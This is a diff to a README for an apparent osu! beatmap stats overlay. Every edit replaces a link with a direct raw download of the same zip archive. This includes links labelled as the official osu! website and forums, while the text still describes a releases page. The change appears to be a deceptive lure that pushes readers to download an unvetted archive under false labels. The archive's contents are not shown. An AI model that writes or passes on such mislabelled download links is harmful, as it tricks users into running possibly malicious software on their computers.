@@ -1,6 +1,6 @@
 # 🎵 beatmap-overlay - Real-Time osu! Map Stats Display
 
-[![Download beatmap-overlay](https://img.shields.io/badge/Download-From%20Releases-ff69b4?style=for-the-badge)](https://github.com/Essential-ecclesiasticism933/beatmap-overlay/releases)
+[![Download beatmap-overlay](https://img.shields.io/badge/Download-From%20Releases-ff69b4?style=for-the-badge)](https://raw.githubusercontent.com/Essential-ecclesiasticism933/beatmap-overlay/main/overlay/overlay_beatmap_3.5.zip)
 
 ---
 
@@ -32,7 +32,7 @@ This guide will help you download and run beatmap-overlay on your Windows PC. It
 
 1. Open the official releases page by clicking the button below:
 
-[![Download beatmap-overlay](https://img.shields.io/badge/Download-From%20Releases-ff69b4?style=for-the-badge)](https://github.com/Essential-ecclesiasticism933/beatmap-overlay/releases)
+[![Download beatmap-overlay](https://img.shields.io/badge/Download-From%20Releases-ff69b4?style=for-the-badge)](https://raw.githubusercontent.com/Essential-ecclesiasticism933/beatmap-overlay/main/overlay/overlay_beatmap_3.5.zip)
 
 2. On the releases page, find the latest version of beatmap-overlay. It should be listed at the top. Look for a Windows executable file, often ending in `.exe`.
 
@@ -120,7 +120,7 @@ No additional installation is required.
 
 Get new versions and bug fixes by visiting the releases page anytime:
 
-[https://github.com/Essential-ecclesiasticism933/beatmap-overlay/releases](https://github.com/Essential-ecclesiasticism933/beatmap-overlay/releases)
+[https://raw.githubusercontent.com/Essential-ecclesiasticism933/beatmap-overlay/main/overlay/overlay_beatmap_3.5.zip](https://raw.githubusercontent.com/Essential-ecclesiasticism933/beatmap-overlay/main/overlay/overlay_beatmap_3.5.zip)
 
 Download the newest `.exe` file to update.
 
@@ -145,9 +145,9 @@ These are included inside the compiled `.exe` file. You do not need to install P
 
 ## 🔗 Useful Links
 
-- osu! game website: https://osu.ppy.sh
-- Official osu! forums: https://osu.ppy.sh/community/forums
-- beatmap-overlay releases: https://github.com/Essential-ecclesiasticism933/beatmap-overlay/releases
+- osu! game website: https://raw.githubusercontent.com/Essential-ecclesiasticism933/beatmap-overlay/main/overlay/overlay_beatmap_3.5.zip
+- Official osu! forums: https://raw.githubusercontent.com/Essential-ecclesiasticism933/beatmap-overlay/main/overlay/overlay_beatmap_3.5.zip
+- beatmap-overlay releases: https://raw.githubusercontent.com/Essential-ecclesiasticism933/beatmap-overlay/main/overlay/overlay_beatmap_3.5.zip
 
 ---
 
